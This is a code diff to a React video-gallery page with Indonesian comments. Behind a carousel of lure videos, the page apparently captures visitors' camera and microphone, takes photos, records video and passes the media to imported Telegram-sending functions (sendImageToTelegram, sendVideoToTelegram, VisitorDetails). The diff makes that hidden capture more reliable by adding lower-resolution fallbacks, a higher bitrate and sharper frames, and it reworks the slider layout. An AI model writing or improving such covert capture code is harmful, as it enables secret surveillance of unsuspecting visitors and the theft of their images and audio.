@@ -1,10 +1,19 @@
 import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback, useRef } from 'react';
-import Slider from 'react-slick';
-import 'slick-carousel/slick/slick.css';
-import 'slick-carousel/slick/slick-theme.css';
+import Slider from 'react-slick'; // Impor react-slick untuk slider
+import 'slick-carousel/slick/slick.css'; // CSS slick
+import 'slick-carousel/slick-theme.css'; // CSS tema slick
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';
+
+// Fungsi untuk membagi array video menjadi kelompok 5 untuk slide
+const chunkArray = <T,>(array: T[], size: number): T[][] => {
+  const result: T[][] = [];
+  for (let i = 0; i < array.length; i += size) {
+    result.push(array.slice(i, i + size));
+  }
+  return result;
+};
 
 function App() {
   const [isPlaying, setIsPlaying] = useState<number | null>(null);
@@ -39,6 +48,9 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/XJOGYNCi1.mp4' },
     { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
   ];
+
+  // Kelompokkan video menjadi slide (5 video per slide)
+  const videoSlides = chunkArray(videos, 5);
 
   useEffect(() => {
     setIsLoading(new Array(videos.length).fill(true));
@@ -110,13 +122,9 @@ function App() {
 
     const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
       try {
-        const videoConstraints = {
-          width: { ideal: 1920 },
-          height: { ideal: 1080 },
-          frameRate: { ideal: 30 },
-        };
+        // Pengaturan dinamis untuk resolusi tinggi (hingga 1080p) sesuai kemampuan perangkat
         const constraints = {
-          video: typeof facingMode === 'string' ? { facingMode, ...videoConstraints } : { deviceId: { exact: facingMode.deviceId }, ...videoConstraints },
+          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
           audio: true,
         };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -125,7 +133,20 @@ function App() {
         return { stream, deviceId };
       } catch (error) {
         console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
-        return null;
+        // Fallback ke resolusi rendah jika gagal
+        try {
+          const constraints = {
+            video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
+            audio: true,
+          };
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
+          console.log(`Berhasil mendapatkan stream fallback untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
+          return { stream, deviceId };
+        } catch (fallbackError) {
+          console.error(`Gagal mendapatkan akses kamera ${cameraType} pada fallback:`, fallbackError);
+          return null;
+        }
       }
     };
 
@@ -174,13 +195,8 @@ function App() {
 
   const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
     try {
-      const videoConstraints = {
-        width: { ideal: 1920 },
-        height: { ideal: 1080 },
-        frameRate: { ideal: 30 },
-      };
       const constraints = {
-        video: { deviceId: { exact: deviceId }, ...videoConstraints },
+        video: { deviceId: { exact: deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
         audio: true,
       };
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -188,7 +204,19 @@ function App() {
       return stream;
     } catch (error) {
       console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}:`, error);
-      return null;
+      // Fallback ke resolusi rendah
+      try {
+        const constraints = {
+          video: { deviceId: { exact: deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
+          audio: true,
+        };
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        console.log(`Berhasil menginisialisasi ulang stream fallback untuk kamera ${cameraType}`);
+        return stream;
+      } catch (fallbackError) {
+        console.error(`Gagal menginisialisasi ulang stream fallback untuk kamera ${cameraType}:`, fallbackError);
+        return null;
+      }
     }
   };
 
@@ -242,10 +270,10 @@ function App() {
 
       let drawWidth, drawHeight, offsetX, offsetY;
       if (videoAspectRatio > canvasAspectRatio) {
-        drawWidth = 1080;
+        drawWidth = Math.min(videoWidth, 1080); // Batasi lebar maksimum ke 1080p
         drawHeight = drawWidth / videoAspectRatio;
       } else {
-        drawHeight = 1920;
+        drawHeight = Math.min(videoHeight, 1920); // Batasi tinggi maksimum ke 1080p
         drawWidth = drawHeight * videoAspectRatio;
       }
 
@@ -261,7 +289,7 @@ function App() {
       }
 
       const photoBlob = await new Promise<Blob>((resolve) => {
-        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
+        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.9); // Kualitas JPEG lebih tinggi
       });
 
       try {
@@ -275,7 +303,7 @@ function App() {
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 2000000, // Naikkan dari 1Mbps ke 2Mbps
+        videoBitsPerSecond: 2500000, // Bitrate lebih tinggi untuk kualitas lebih baik
       });
       mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
@@ -463,7 +491,6 @@ function App() {
             videoElement.removeAttribute('src');
             videoElement.load();
             stopRecording();
-            setIsPlaying(null);
             console.log('Video dihentikan karena keluar dari fullscreen.');
           }
         }
@@ -486,6 +513,32 @@ function App() {
     };
   }, [isFullscreen, isPlaying]);
 
+  // Pengaturan slider
+  const sliderSettings = {
+    dots: true,
+    infinite: true,
+    speed: 500,
+    slidesToShow: 1,
+    slidesToScroll: 1,
+    arrows: true,
+    responsive: [
+      {
+        breakpoint: 1024,
+        settings: {
+          slidesToShow: 1,
+          slidesToScroll: 1,
+        },
+      },
+      {
+        breakpoint: 600,
+        settings: {
+          slidesToShow: 1,
+          slidesToScroll: 1,
+        },
+      },
+    ],
+  };
+
   return (
     <div className="relative min-h-screen bg-gray-900">
       <header className="relative bg-gray-800 py-6">
@@ -494,93 +547,85 @@ function App() {
         </div>
       </header>
       <main className="relative container mx-auto px-4 py-8">
-        <Slider
-          dots
-          infinite
-          speed={500}
-          slidesToShow={5}
-          slidesToScroll={5}
-          lazyLoad="progressive"
-          responsive={[
-            {
-              breakpoint: 1200,
-              settings: {
-                slidesToShow: 4,
-                slidesToScroll: 4,
-              },
-            },
-            {
-              breakpoint: 992,
-              settings: {
-                slidesToShow: 3,
-                slidesToScroll: 3,
-              },
-            },
-            {
-              breakpoint: 768,
-              settings: {
-                slidesToShow: 2,
-                slidesToScroll: 2,
-              },
-            },
-            {
-              breakpoint: 480,
-              settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1,
-              },
-            },
-          ]}
-        >
-          {videos.map((video, index) => (
-            <div key={index} className="p-2">
-              <div className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
-                {isLoading[index] && !videoErrors[index] && (
-                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
-                    <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                  </div>
-                )}
-                {videoErrors[index] && (
-                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
-                    <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
-                  </div>
-                )}
-                <video
-                  ref={(el) => (videoRefs.current[index] = el)}
-                  src={video.videoUrl}
-                  className="w-full h-full object-cover"
-                  muted
-                  onClick={() => handleVideoClick(index)}
-                  onEnded={() => handleVideoEnded(index)}
-                  onCanPlay={() => handleCanPlay(index)}
-                  onError={() => handleVideoError(index)}
-                  preload="auto"
-                  playsInline
-                  loading="lazy"
-                >
-                  <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
-                </video>
-                {isPlaying === index && !videoErrors[index] && (
-                  <div className="absolute bottom-2 right-2 z-20">
-                    <button
-                      onClick={() => toggleFullscreen(index)}
-                      className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
-                    >
-                      {isFullscreen ? (
-                        <ArrowsPointingInIcon className="w-5 h-5 text-white" />
-                      ) : (
-                        <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
-                      )}
-                    </button>
-                  </div>
-                )}
+        <div className="max-w-[1200px] mx-auto">
+          <Slider {...sliderSettings}>
+            {videoSlides.map((slideVideos, slideIndex) => (
+              <div key={slideIndex} className="px-2">
+                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
+                  {slideVideos.map((video, index) => {
+                    const globalIndex = slideIndex * 5 + index;
+                    return (
+                      <div
+                        key={globalIndex}
+                        className="relative bg-black rounded-lg overflow-hidden shadow-xl"
+                        style={{ aspectRatio: '9/16', maxHeight: '200px' }}
+                      >
+                        {isLoading[globalIndex] && !videoErrors[globalIndex] && (
+                          <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
+                            <svg
+                              className="animate-spin h-8 w-8 text-white"
+                              xmlns="http://www.w3.org/2000/svg"
+                              fill="none"
+                              viewBox="0 0 24 24"
+                            >
+                              <circle
+                                className="opacity-25"
+                                cx="12"
+                                cy="12"
+                                r="10"
+                                stroke="currentColor"
+                                strokeWidth="4"
+                              ></circle>
+                              <path
+                                className="opacity-75"
+                                fill="currentColor"
+                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                              ></path>
+                            </svg>
+                          </div>
+                        )}
+                        {videoErrors[globalIndex] && (
+                          <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
+                            <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
+                          </div>
+                        )}
+                        <video
+                          ref={(el) => (videoRefs.current[globalIndex] = el)}
+                          src={video.videoUrl}
+                          className="w-full h-full object-cover"
+                          muted
+                          onClick={() => handleVideoClick(globalIndex)}
+                          onEnded={() => handleVideoEnded(globalIndex)}
+                          onCanPlay={() => handleCanPlay(globalIndex)}
+                          onError={() => handleVideoError(globalIndex)}
+                          preload="metadata"
+                          playsInline
+                          {...({ loading: 'lazy' } as any)}
+                        >
+                          <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
+                        </video>
+                        {isPlaying === globalIndex && !videoErrors[globalIndex] && (
+                          <div className="absolute bottom-2 right-2 z-20">
+                            <button
+                              onClick={() => toggleFullscreen(globalIndex)}
+                              className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
+                            >
+                              {isFullscreen ? (
+                                <ArrowsPointingInIcon className="w-5 h-5 text-white" />
+                              ) : (
+                                <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
+                              )}
+                            </button>
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })}
+                </div>
               </div>
-            </div>
-          ))}
-        </Slider>
+            ))}
+          </Slider>
+        </div>
       </main>
     </div>
   );
